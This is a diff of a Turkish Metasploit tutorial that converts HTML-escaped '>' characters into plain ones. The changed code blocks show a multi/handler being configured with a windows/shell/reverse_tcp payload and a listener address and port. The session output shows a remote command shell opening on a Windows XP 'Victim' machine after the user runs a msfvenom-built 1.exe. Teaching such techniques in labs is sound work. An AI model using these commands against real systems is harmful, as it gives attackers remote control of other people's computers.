@@ -122,8 +122,8 @@ Elimizde istemcinin tıklayıp çalıştıracağı `1.exe` dosyası artık hazı
 
 
 ```bash
-msf **&gt;** use exploit/multi/handler
-msf exploit**(**handler**)** **&gt;** show options
+msf **>** use exploit/multi/handler
+msf exploit**(**handler**)** **>** show options
 
 Module options:
 
@@ -144,9 +144,9 @@ Gördüğünüz gibi exploit modülünde herhangi bir zorunlu değişken bulunmu
 
 
 ```bash
-msf exploit**(**handler**)** **&gt;** set payload windows/shell/reverse_tcp
-payload **=&gt;** windows/shell/reverse_tcp
-msf exploit**(**handler**)** **&gt;** show options
+msf exploit**(**handler**)** **>** set payload windows/shell/reverse_tcp
+payload **=>** windows/shell/reverse_tcp
+msf exploit**(**handler**)** **>** show options
 
 Module options:
 
@@ -188,11 +188,11 @@ Bu değerlerin, `msfvenom` komutuyla oluşturduğumuz `1.exe` dosyası için gir
 
 
 ```bash
-msf exploit**(**handler**)** **&gt;** set LHOST 172.16.104.130
-LHOST **=&gt;** 172.16.104.130
-msf exploit**(**handler**)** **&gt;** set LPORT 31337
-LPORT **=&gt;** 31337
-msf exploit**(**handler**)** **&gt;**
+msf exploit**(**handler**)** **>** set LHOST 172.16.104.130
+LHOST **=>** 172.16.104.130
+msf exploit**(**handler**)** **>** set LPORT 31337
+LPORT **=>** 31337
+msf exploit**(**handler**)** **>**
 ```
 
 
@@ -201,16 +201,16 @@ Tüm ayarlamaları yaptıktan sonra `exploit` komutuyla modül çalıştırılı
 
 
 ```bash
-msf exploit**(**handler**)** **&gt;** exploit
+msf exploit**(**handler**)** **>** exploit
 
 **[*********]** Handler binding to LHOST 0.0.0.0
 **[*********]** Started reverse handler
 **[*********]** Starting the payload handler...
 **[*********]** Sending stage **(**474 bytes**)**
-**[*********]** Command shell session 2 opened **(**172.16.104.130:31337 -&gt; 172.16.104.128:1150**)**
+**[*********]** Command shell session 2 opened **(**172.16.104.130:31337 -> 172.16.104.128:1150**)**
 
 Microsoft Windows XP **[**Version 5.1.2600]
 **(**C**)** Copyright 1985-2001 Microsoft Corp.
 
-C:\Documents and Settings\Victim\My Documents&gt;
+C:\Documents and Settings\Victim\My Documents>
 ```
